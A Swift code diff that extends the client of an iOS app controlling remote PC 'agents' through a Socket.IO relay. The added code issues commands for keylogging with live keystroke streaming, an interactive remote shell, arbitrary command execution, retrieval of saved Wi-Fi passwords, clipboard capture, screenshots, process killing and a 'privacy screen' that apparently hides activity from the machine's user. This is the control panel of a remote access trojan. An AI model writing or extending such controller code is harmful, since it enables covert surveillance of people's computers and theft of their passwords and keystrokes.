@@ -13,11 +13,24 @@ final class RelayClient: ObservableObject {
     @Published var selectedAgent: String? = nil
 
     // Callbacks set by ViewModel
-    var onJpegFrame:    ((Data) -> Void)?
-    var onFastcapFrame: ((Data) -> Void)?   // H.264 annex-B
-    var onFastcapReady: (() -> Void)?
-    var onWebrtcOffer:  ((String, String) -> Void)?   // (sdp, type)
-    var onLog:          ((String) -> Void)?
+    var onJpegFrame:        ((Data) -> Void)?
+    var onFastcapFrame:     ((Data) -> Void)?           // H.264 annex-B
+    var onFastcapReady:     (() -> Void)?
+    var onWebrtcOffer:      ((String, String) -> Void)? // (sdp, type)
+    var onLog:              ((String) -> Void)?
+
+    // Hub feature callbacks
+    var onPrivacyResult:    ((Bool, String) -> Void)?   // (active, message)
+    var onScreenshotResult: ((UIImage?) -> Void)?
+    var onSysInfoResult:    (([String: Any]) -> Void)?
+    var onCommandResult:    ((String) -> Void)?
+    var onKeylogStatus:     ((Bool, String) -> Void)?   // (running, error)
+    var onKeyChar:          ((String) -> Void)?         // live keylog char
+    var onShellOutput:      ((String, Bool) -> Void)?   // (data, closed)
+    var onPowerResult:      (([String: Any]) -> Void)?
+    var onWifiPasswords:    (([String: Any]) -> Void)?
+    var onProcesses:        (([[String: Any]]) -> Void)?
+    var onClipboard:        ((String) -> Void)?         // clipboard content from agent
 
     // MARK: - Private
 
@@ -111,7 +124,6 @@ final class RelayClient: ObservableObject {
 
     // MARK: - Remote control (mouse, keyboard, type, scroll)
 
-    /// Send any "command" event with an action. x/y are normalized 0..1.
     func sendCommand(_ payload: [String: Any]) {
         guard let agent = selectedAgent else { return }
         var p = payload
@@ -147,12 +159,88 @@ final class RelayClient: ObservableObject {
         sendCommand(["action": "type", "text": text])
     }
 
-    func keyPress(key: String, code: String) {
-        sendCommand(["action": "keydown", "key": key, "code": code])
-        // Brief delay then keyup — matches hub.html's tapKey pattern
+    func keyPress(key: String, code: String, ctrl: Bool = false, shift: Bool = false, alt: Bool = false) {
+        var down: [String: Any] = ["action": "keydown", "key": key, "code": code]
+        var up:   [String: Any] = ["action": "keyup",   "key": key, "code": code]
+        if ctrl  { down["ctrlKey"]  = true; up["ctrlKey"]  = true }
+        if shift { down["shiftKey"] = true; up["shiftKey"] = true }
+        if alt   { down["altKey"]   = true; up["altKey"]   = true }
+        sendCommand(down)
         DispatchQueue.main.asyncAfter(deadline: .now() + 0.06) { [weak self] in
-            self?.sendCommand(["action": "keyup", "key": key, "code": code])
+            self?.sendCommand(up)
         }
+    }
+
+    // MARK: - Hub feature commands
+
+    func privacyStart() {
+        guard let agent = selectedAgent else { return }
+        sio.emit("privacy_start", ["_target": agent])
+    }
+
+    func privacyStop() {
+        guard let agent = selectedAgent else { return }
+        sio.emit("privacy_stop", ["_target": agent])
+    }
+
+    func takeScreenshot() {
+        guard let agent = selectedAgent else { return }
+        sio.emit("take_screenshot", ["_target": agent])
+    }
+
+    func getSysInfo() {
+        guard let agent = selectedAgent else { return }
+        sio.emit("get_sysinfo", ["_target": agent])
+    }
+
+    func runCommand(_ cmd: String) {
+        guard let agent = selectedAgent else { return }
+        sio.emit("run_command", ["_target": agent, "command": cmd])
+    }
+
+    func keylogOn() {
+        guard let agent = selectedAgent else { return }
+        sio.emit("keylog_on", ["_target": agent])
+    }
+
+    func keylogOff() {
+        guard let agent = selectedAgent else { return }
+        sio.emit("keylog_off", ["_target": agent])
+    }
+
+    func shellStart() {
+        guard let agent = selectedAgent else { return }
+        sio.emit("shell_start", ["_target": agent])
+    }
+
+    func shellInput(_ text: String) {
+        guard let agent = selectedAgent else { return }
+        sio.emit("shell_input", ["_target": agent, "data": text + "\n"])
+    }
+
+    func shellStop() {
+        guard let agent = selectedAgent else { return }
+        sio.emit("shell_stop", ["_target": agent])
+    }
+
+    func powerAction(_ action: String) {
+        guard let agent = selectedAgent else { return }
+        sio.emit("power_action", ["_target": agent, "action": action])
+    }
+
+    func getWifiPasswords() {
+        guard let agent = selectedAgent else { return }
+        sio.emit("get_wifi_passwords", ["_target": agent])
+    }
+
+    func getProcesses() {
+        guard let agent = selectedAgent else { return }
+        sio.emit("get_processes", ["_target": agent])
+    }
+
+    func killProcess(_ pid: Int) {
+        guard let agent = selectedAgent else { return }
+        sio.emit("kill_process", ["_target": agent, "pid": pid])
     }
 
     // MARK: - Private setup
@@ -172,7 +260,7 @@ final class RelayClient: ObservableObject {
             self.onLog?("Socket.IO disconnected: \(err?.localizedDescription ?? "none")")
         }
 
-        // Agent list — relay sends [{"name": "AgentName"}, ...]
+        // Agent list
         sio.on("agent_list") { [weak self] args in
             guard let self,
                   let first = args.first,
@@ -201,7 +289,7 @@ final class RelayClient: ObservableObject {
             self.onLog?("Agent left: \(name)")
         }
 
-        // JPEG screen frame — PC agent emits "frame", not "screen_frame"
+        // JPEG screen frame
         sio.on("frame") { [weak self] args in
             guard let self,
                   let d   = args.first as? [String: Any],
@@ -210,7 +298,7 @@ final class RelayClient: ObservableObject {
             self.onJpegFrame?(img)
         }
 
-        // FastCap info — store session/password; relay re-delivers on hub_join
+        // FastCap info
         sio.on("fastcap_info") { [weak self] args in
             guard let self,
                   let d    = args.first as? [String: Any],
@@ -221,7 +309,6 @@ final class RelayClient: ObservableObject {
             self.onLog?("fastcap_info session=\(sess.prefix(8))…")
         }
 
-        // Relay confirmed fastcap host is alive
         sio.on("fastcap_ready") { [weak self] args in
             guard let self,
                   let d    = args.first as? [String: Any],
@@ -230,7 +317,6 @@ final class RelayClient: ObservableObject {
             self.onLog?("fastcap_ready: host alive")
         }
 
-        // H.264 video via relay — b64 field: base64([keyFlag(1 byte)] + annexB)
         sio.on("fastcap_video") { [weak self] args in
             guard let self,
                   let d   = args.first as? [String: Any],
@@ -240,7 +326,7 @@ final class RelayClient: ObservableObject {
             self.onFastcapFrame?(Data(raw.dropFirst()))
         }
 
-        // WebRTC: PC-generated SDP offer arrives here; viewer answers.
+        // WebRTC
         sio.on("webrtc_offer") { [weak self] args in
             guard let self,
                   let d   = args.first as? [String: Any],
@@ -248,6 +334,81 @@ final class RelayClient: ObservableObject {
                   let typ = d["type"] as? String else { return }
             self.onLog?("webrtc_offer received (sdp \(sdp.count) bytes)")
             self.onWebrtcOffer?(sdp, typ)
+        }
+
+        // ── Hub feature results ────────────────────────────────────────────
+
+        sio.on("privacy_result") { [weak self] args in
+            guard let self, let d = args.first as? [String: Any] else { return }
+            let active = d["active"] as? Bool ?? false
+            let msg    = d["error"]  as? String ?? (active ? "Privacy screen on" : "Privacy screen off")
+            self.onPrivacyResult?(active, msg)
+        }
+
+        sio.on("screenshot_result") { [weak self] args in
+            guard let self, let d = args.first as? [String: Any] else { return }
+            if let b64 = d["data"] as? String,
+               let raw  = Data(base64Encoded: b64, options: .ignoreUnknownCharacters),
+               let img  = UIImage(data: raw) {
+                self.onScreenshotResult?(img)
+            } else {
+                self.onScreenshotResult?(nil)
+            }
+        }
+
+        sio.on("sysinfo_result") { [weak self] args in
+            guard let self, let d = args.first as? [String: Any] else { return }
+            self.onSysInfoResult?(d)
+        }
+
+        sio.on("command_result") { [weak self] args in
+            guard let self, let d = args.first as? [String: Any] else { return }
+            let out = d["output"] as? String ?? d["error"] as? String ?? "(no output)"
+            self.onCommandResult?(out)
+        }
+
+        sio.on("keylog_status") { [weak self] args in
+            guard let self, let d = args.first as? [String: Any] else { return }
+            let running = d["running"] as? Bool ?? false
+            let err     = d["error"]   as? String ?? ""
+            self.onKeylogStatus?(running, err)
+        }
+
+        // Live keylog chars arriving from agent
+        sio.on("key") { [weak self] args in
+            guard let self, let d = args.first as? [String: Any],
+                  let ch = d["char"] as? String else { return }
+            self.onKeyChar?(ch)
+        }
+
+        sio.on("shell_output") { [weak self] args in
+            guard let self, let d = args.first as? [String: Any] else { return }
+            let data   = d["data"]   as? String ?? ""
+            let closed = d["closed"] as? Bool   ?? false
+            self.onShellOutput?(data, closed)
+        }
+
+        sio.on("power_result") { [weak self] args in
+            guard let self, let d = args.first as? [String: Any] else { return }
+            self.onPowerResult?(d)
+        }
+
+        sio.on("wifi_passwords_result") { [weak self] args in
+            guard let self, let d = args.first as? [String: Any] else { return }
+            self.onWifiPasswords?(d)
+        }
+
+        sio.on("processes_result") { [weak self] args in
+            guard let self, let d = args.first as? [String: Any] else { return }
+            let procs = d["processes"] as? [[String: Any]] ?? []
+            self.onProcesses?(procs)
+        }
+
+        // Clipboard content pushed from agent
+        sio.on("clipboard") { [weak self] args in
+            guard let self, let d = args.first as? [String: Any],
+                  let text = d["text"] as? String else { return }
+            self.onClipboard?(text)
         }
     }
 }
